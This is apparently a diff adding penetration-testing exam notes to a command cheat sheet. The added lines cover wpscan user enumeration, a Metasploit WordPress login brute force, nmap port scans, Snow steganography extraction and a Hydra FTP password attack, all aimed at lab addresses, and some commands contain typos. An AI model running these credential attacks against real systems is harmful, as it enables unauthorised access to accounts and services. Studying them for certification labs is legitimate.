@@ -257,3 +257,33 @@ start msfconsole
 sudo msfdb init
 sudo msfdb start
 sudo msfdb status
+
+
+
+
+Net  user
+Snow.exe -C -p “given_password” file_name
+—---------------------
+
+wpscan --url http://10.10.10.12:8080/CEG --enumerate u
+msfconsole
+use axiliary/scanner/http/wordpress_login_enum
+PASS_FILE /root/Desktop/wordlists/Passwords.txt
+set RHOSTs 10.10.10.12
+set RPORT 8080
+set TARGETURI http://10.10.10.12:8080/CEH/
+set USERNAME admin
+run
+
+—------------------------
+Nmap -Pn -p 21 target > ftp
+grep -B 5 open ftp
+
+—--------------------------
+Nmap -Pn -p 3389 target > rdp
+grep -B 5 open rdp
+—-------------------------
+Nmap -Pn -p 3306 target > mysql
+grep -B 5 open mysql
+
+Hydra -l james -P given_wordlist ftp://target
